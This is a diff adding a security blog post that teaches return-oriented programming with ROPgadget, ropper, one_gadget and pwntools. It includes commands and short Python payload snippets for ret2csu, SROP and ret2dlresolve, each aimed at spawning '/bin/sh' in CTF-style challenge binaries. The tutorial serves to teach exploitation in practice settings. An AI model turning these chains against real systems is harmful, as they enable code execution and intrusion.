@@ -1,0 +1,271 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>finding gadgets: ROPgadget, ropper, one_gadget, pwntools — algoatson.github.io</title>
+<meta name="description" content="NX means you reuse the code that&#x27;s already there. Here are the tools that find the pieces, the pwntools layer that assembles them into a chain, and the three structured techniques for when a clean `pop rdi; ret` just isn&#x27;t in the binary.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/finding-gadgets/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="finding gadgets: ROPgadget, ropper, one_gadget, pwntools — algoatson.github.io">
+<meta property="og:description" content="NX means you reuse the code that&#x27;s already there. Here are the tools that find the pieces, the pwntools layer that assembles them into a chain, and the three structured techniques for when a clean `pop rdi; ret` just isn&#x27;t in the binary.">
+<meta property="og:url" content="https://algoatson.github.io/p/finding-gadgets/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/finding-gadgets.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "finding gadgets: ROPgadget, ropper, one_gadget, pwntools", "datePublished": "2026-05-12", "dateModified": "2026-05-12", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "NX means you reuse the code that's already there. Here are the tools that find the pieces, the pwntools layer that assembles them into a chain, and the three structured techniques for when a clean `pop rdi; ret` just isn't in the binary.", "url": "https://algoatson.github.io/p/finding-gadgets/", "mainEntityOfPage": "https://algoatson.github.io/p/finding-gadgets/", "keywords": "pwn, rop, tooling"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>finding gadgets: ROPgadget, ropper, one_gadget, pwntools</h1>
+  <div class="meta"><span>2026-05-12</span><span>5 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/rop/">rop</a> <a class="tag" href="/tags/tooling/">tooling</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-search-tools">the search tools</a></li>
+<li><a href="#one_gadget">one_gadget</a></li>
+<li><a href="#let-pwntools-assemble-it">let pwntools assemble it</a></li>
+<li><a href="#when-the-gadgets-arent-there">when the gadgets aren't there</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p><code class="highlight">NX enabled</code> means the stack isn't executable, so you can't run your own bytes —
+you run the program's. Return-oriented programming chains together short
+instruction sequences that end in <code class="highlight">ret</code> ("gadgets") into a new program. The
+skill is half <em>finding</em> gadgets and half <em>not needing</em> the ones that aren't there.</p>
+<h2 id="the-search-tools">the search tools<a class="headerlink" href="#the-search-tools" title="Permanent link">#</a></h2>
+<p>Two do almost the same job; I keep both because their search syntax differs and
+sometimes one parses a weird binary the other chokes on.</p>
+<figure class="codeblock"><figcaption><span class="lang">console</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1"> 1</a></span>
+<span class="normal"><a href="#code-2"> 2</a></span>
+<span class="normal"><a href="#code-3"> 3</a></span>
+<span class="normal"><a href="#code-4"> 4</a></span>
+<span class="normal"><a href="#code-5"> 5</a></span>
+<span class="normal"><a href="#code-6"> 6</a></span>
+<span class="normal"><a href="#code-7"> 7</a></span>
+<span class="normal"><a href="#code-8"> 8</a></span>
+<span class="normal"><a href="#code-9"> 9</a></span>
+<span class="normal"><a href="#code-10">10</a></span>
+<span class="normal"><a href="#code-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1"><span class="gp"># </span>ROPgadget
+</span><span id="code-2"><span class="gp">$ </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>./chal<span class="w">                       </span><span class="c1"># dump everything</span>
+</span><span id="code-3"><span class="gp">$ </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>./chal<span class="w"> </span>--only<span class="w"> </span><span class="s2">&quot;pop|ret&quot;</span><span class="w">      </span><span class="c1"># filter by mnemonic</span>
+</span><span id="code-4"><span class="gp">$ </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>./chal<span class="w"> </span>--string<span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w">    </span><span class="c1"># find the string, get its addr</span>
+</span><span id="code-5"><span class="gp">$ </span>ROPgadget<span class="w"> </span>--binary<span class="w"> </span>./chal<span class="w"> </span>--ropchain<span class="w">            </span><span class="c1"># try to auto-build an execve chain</span>
+</span><span id="code-6">
+</span><span id="code-7"><span class="gp"># </span>ropper
+</span><span id="code-8"><span class="gp">$ </span>ropper<span class="w"> </span>--file<span class="w"> </span>./chal<span class="w"> </span>--search<span class="w"> </span><span class="s2">&quot;pop rdi; ret&quot;</span>
+</span><span id="code-9"><span class="gp">$ </span>ropper<span class="w"> </span>--file<span class="w"> </span>./chal<span class="w"> </span>--search<span class="w"> </span><span class="s2">&quot;pop r?i; ret&quot;</span><span class="w">    </span><span class="c1"># ? and % wildcards</span>
+</span><span id="code-10"><span class="gp">$ </span>ropper<span class="w"> </span>--file<span class="w"> </span>./chal<span class="w"> </span>--string<span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
+</span><span id="code-11"><span class="gp">$ </span>ropper<span class="w"> </span>--file<span class="w"> </span>./chal<span class="w"> </span>--chain<span class="w"> </span><span class="s2">&quot;execve&quot;</span><span class="w"> </span>--badbytes<span class="w"> </span>000a
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<table>
+<thead>
+<tr>
+<th>need</th>
+<th>command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>every gadget</td>
+<td><code class="highlight">ROPgadget --binary ./chal</code></td>
+</tr>
+<tr>
+<td>one specific gadget</td>
+<td><code class="highlight">ropper -f ./chal --search &quot;pop rdi; ret&quot;</code></td>
+</tr>
+<tr>
+<td>a string's address</td>
+<td><code class="highlight">ROPgadget --binary ./chal --string &quot;/bin/sh&quot;</code></td>
+</tr>
+<tr>
+<td>an auto execve chain</td>
+<td><code class="highlight">ROPgadget --binary ./chal --ropchain</code></td>
+</tr>
+<tr>
+<td>chain with bad bytes excluded</td>
+<td><code class="highlight">ropper -f ./chal --chain execve --badbytes 000a</code></td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">search libc, not just the binary</p>
+<p>A small statically-linked binary has few gadgets; libc has a universe of them.
+Once you've leaked a libc base, run the same searches against <code class="highlight">./libc.so.6</code> and
+rebase the offsets. Most "impossible, no gadgets" situations are just looking
+in the wrong object.</p>
+</div>
+<h2 id="one_gadget">one_gadget<a class="headerlink" href="#one_gadget" title="Permanent link">#</a></h2>
+<p>The single most time-saving libc tool. It finds the addresses where one <code class="highlight">jmp</code>
+lands you in an <code class="highlight">execve(&quot;/bin/sh&quot;, ...)</code> — no chain required — and, crucially,
+prints the <strong>constraints</strong> that must hold at that moment:</p>
+<figure class="codeblock"><figcaption><span class="lang">console</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-2-1"> 1</a></span>
+<span class="normal"><a href="#code-2-2"> 2</a></span>
+<span class="normal"><a href="#code-2-3"> 3</a></span>
+<span class="normal"><a href="#code-2-4"> 4</a></span>
+<span class="normal"><a href="#code-2-5"> 5</a></span>
+<span class="normal"><a href="#code-2-6"> 6</a></span>
+<span class="normal"><a href="#code-2-7"> 7</a></span>
+<span class="normal"><a href="#code-2-8"> 8</a></span>
+<span class="normal"><a href="#code-2-9"> 9</a></span>
+<span class="normal"><a href="#code-2-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-2-1"><span class="gp">$ </span>one_gadget<span class="w"> </span>./libc.so.6
+</span><span id="code-2-2"><span class="go">0x50a37 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span>
+</span><span id="code-2-3"><span class="go">constraints:</span>
+</span><span id="code-2-4"><span class="go">  rsp &amp; 0xf == 0</span>
+</span><span id="code-2-5"><span class="go">  rcx == NULL</span>
+</span><span id="code-2-6">
+</span><span id="code-2-7"><span class="go">0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span>
+</span><span id="code-2-8"><span class="go">constraints:</span>
+</span><span id="code-2-9"><span class="go">  [r10] == NULL || r10 == NULL</span>
+</span><span id="code-2-10"><span class="go">  ...</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Read the constraints, don't just spray the offsets. Half of "the one_gadget
+doesn't work" is a register that isn't <code class="highlight">NULL</code> when you jump. If none fit, set up
+the registers first or fall back to a <code class="highlight">system(&quot;/bin/sh&quot;)</code> chain.</p>
+<h2 id="let-pwntools-assemble-it">let pwntools assemble it<a class="headerlink" href="#let-pwntools-assemble-it" title="Permanent link">#</a></h2>
+<p>Hand-packing a chain is error-prone; <code class="highlight">ROP</code> does the bookkeeping and even finds
+simple gadgets itself:</p>
+<figure class="codeblock"><figcaption><span class="fname">rop.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#roppy-1">1</a></span>
+<span class="normal"><a href="#roppy-2">2</a></span>
+<span class="normal"><a href="#roppy-3">3</a></span>
+<span class="normal"><a href="#roppy-4">4</a></span>
+<span class="normal"><a href="#roppy-5">5</a></span>
+<span class="normal"><a href="#roppy-6">6</a></span>
+<span class="normal"><a href="#roppy-7">7</a></span>
+<span class="normal"><a href="#roppy-8">8</a></span>
+<span class="normal"><a href="#roppy-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="roppy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="roppy-2"><span class="n">elf</span>  <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./chal&quot;</span><span class="p">)</span>
+</span><span id="roppy-3"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>
+</span><span id="roppy-4">
+</span><span id="roppy-5"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">([</span><span class="n">elf</span><span class="p">,</span> <span class="n">libc</span><span class="p">])</span>                 <span class="c1"># search both objects</span>
+</span><span id="roppy-6"><span class="hll"><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&quot;ret&quot;</span><span class="p">]))</span>      <span class="c1"># 16-byte stack alignment (see below)</span>
+</span></span><span id="roppy-7"><span class="hll"><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">,</span> <span class="p">[</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))])</span>
+</span></span><span id="roppy-8"><span class="hll"><span class="nb">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>                      <span class="c1"># human-readable chain, annotated</span>
+</span></span><span id="roppy-9"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">72</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">rop.call(&quot;system&quot;, [arg])</code> figures out it needs <code class="highlight">pop rdi; ret</code>, finds it, and
+orders the chain. <code class="highlight">rop.find_gadget([&quot;pop rdi&quot;, &quot;pop rsi&quot;, &quot;ret&quot;])</code> asks for a
+specific one. <code class="highlight">rop.migrate(new_stack)</code> pivots when the buffer is too short for
+the whole chain.</p>
+<h2 id="when-the-gadgets-arent-there">when the gadgets aren't there<a class="headerlink" href="#when-the-gadgets-arent-there" title="Permanent link">#</a></h2>
+<p>Three techniques for the awkward binary — no <code class="highlight">pop rdx</code>, no <code class="highlight">/bin/sh</code>, almost no
+gadgets at all. Each folded; open the one you're stuck on.</p>
+<details class="note">
+<summary>ret2csu — control rdx without a pop</summary>
+<p>Older glibc-linked binaries contain <code class="highlight">__libc_csu_init</code>, whose tail has a
+universal gadget: a <code class="highlight">pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</code>
+feeding a <code class="highlight">mov rdi, r13; mov rsi, r14; mov edx, r15d; call [r12+rbx*8]</code>. That
+lets you set the first three argument registers and call through a pointer —
+the classic way to get <code class="highlight">rdx</code> (the syscall's third arg) when there's no
+<code class="highlight">pop rdx; ret</code> anywhere.</p>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-4-1"><span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s2">&quot;pop rdi&quot;</span><span class="p">,</span><span class="s2">&quot;pop rsi&quot;</span><span class="p">,</span><span class="s2">&quot;pop rdx&quot;</span><span class="p">])</span>  <span class="c1"># if this fails, reach for csu</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Newer toolchains drop <code class="highlight">__libc_csu_init</code>, so check first — <code class="highlight">ROPgadget --only &quot;pop|ret&quot;</code>
+and look for the six-pop gadget.</p>
+</details>
+<details class="note">
+<summary><abbr title="Sigreturn-Oriented Programming">SROP</abbr> — fake a whole register state</summary>
+<p>If you can call <code class="highlight">sigreturn</code> (or set <code class="highlight">rax = 15</code> and hit a <code class="highlight">syscall</code>), the kernel
+will restore <em>every</em> register from a <code class="highlight">sigcontext</code> you placed on the stack. One
+gadget, total register control:</p>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-5-1">1</a></span>
+<span class="normal"><a href="#code-5-2">2</a></span>
+<span class="normal"><a href="#code-5-3">3</a></span>
+<span class="normal"><a href="#code-5-4">4</a></span>
+<span class="normal"><a href="#code-5-5">5</a></span>
+<span class="normal"><a href="#code-5-6">6</a></span>
+<span class="normal"><a href="#code-5-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-5-1"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span><span id="code-5-2"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+</span><span id="code-5-3"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">binsh</span>
+</span><span id="code-5-4"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span id="code-5-5"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span id="code-5-6"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_gadget</span>
+</span><span id="code-5-7"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">72</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Ideal for tiny static binaries: you don't need argument gadgets, just a
+<code class="highlight">syscall</code> and a way to set <code class="highlight">rax</code>.</p>
+</details>
+<details class="note">
+<summary>ret2dlresolve — call a libc function you didn't import</summary>
+<p>No libc leak and no useful <abbr title="Procedure Linkage Table">PLT</abbr> entries? Forge the relocation structures the
+dynamic linker uses, and make <code class="highlight">_dl_runtime_resolve</code> resolve <code class="highlight">system</code> for you.
+pwntools builds the fake <code class="highlight">Elf64_Rela</code> / <code class="highlight">Elf64_Sym</code> / string:</p>
+<figure class="codeblock"><figcaption><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-6-1">1</a></span>
+<span class="normal"><a href="#code-6-2">2</a></span>
+<span class="normal"><a href="#code-6-3">3</a></span>
+<span class="normal"><a href="#code-6-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-6-1"><span class="n">dl</span> <span class="o">=</span> <span class="n">Ret2dlresolvePayload</span><span class="p">(</span><span class="n">elf</span><span class="p">,</span> <span class="n">symbol</span><span class="o">=</span><span class="s2">&quot;system&quot;</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">])</span>
+</span><span id="code-6-2"><span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dl</span><span class="o">.</span><span class="n">data_addr</span><span class="p">)</span>     <span class="c1"># stage the forged structs into a writable region</span>
+</span><span id="code-6-3"><span class="n">rop</span><span class="o">.</span><span class="n">ret2dlresolve</span><span class="p">(</span><span class="n">dl</span><span class="p">)</span>
+</span><span id="code-6-4"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">72</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Works best on <strong>No PIE, Partial <abbr title="Relocation Read-Only">RELRO</abbr></strong> binaries — Full <abbr title="Relocation Read-Only">RELRO</abbr> resolves
+everything at load and slams this door.</p>
+</details>
+<div class="admonition warning">
+<p class="admonition-title">the movaps tax</p>
+<p>glibc's <code class="highlight">system</code>/<code class="highlight">printf</code> run <code class="highlight">movaps</code> against a 16-byte-aligned stack. Land
+with <code class="highlight">rsp % 16 == 8</code> and they <code class="highlight">SIGSEGV</code> <em>inside libc</em>, which looks exactly like
+a wrong offset. Insert one extra bare <code class="highlight">ret</code> gadget before the call to re-align.
+It's the single most common "my chain is correct but it crashes."</p>
+</div></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/pwntools-cookbook/"><span class="row__date">2026-05-26</span><span class="row__tag">pwn</span><span class="row__title">a pwntools cookbook</span><span class="row__min">4 min</span></a><a class="row" href="/p/checksec-everything/"><span class="row__date">2026-05-19</span><span class="row__tag">tooling</span><span class="row__title">one keybind to checksec everything</span><span class="row__min">3 min</span></a><a class="row" href="/p/ret2libc-warmup/"><span class="row__date">2026-01-29</span><span class="row__tag">pwn</span><span class="row__title">ret2libc on a warm-up: stack smash to shell</span><span class="row__min">4 min</span></a></div></section>
+<nav class="pager"><a class="prev" href="/p/checksec-everything/"><span class="lbl">&#8249; newer</span>one keybind to checksec everything</a><a class="next" href="/p/pwndbg-muscle-memory/"><span class="lbl">older &#8250;</span>pwndbg muscle memory</a></nav></main>
+
+    <footer class="status">
+      <span>15 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
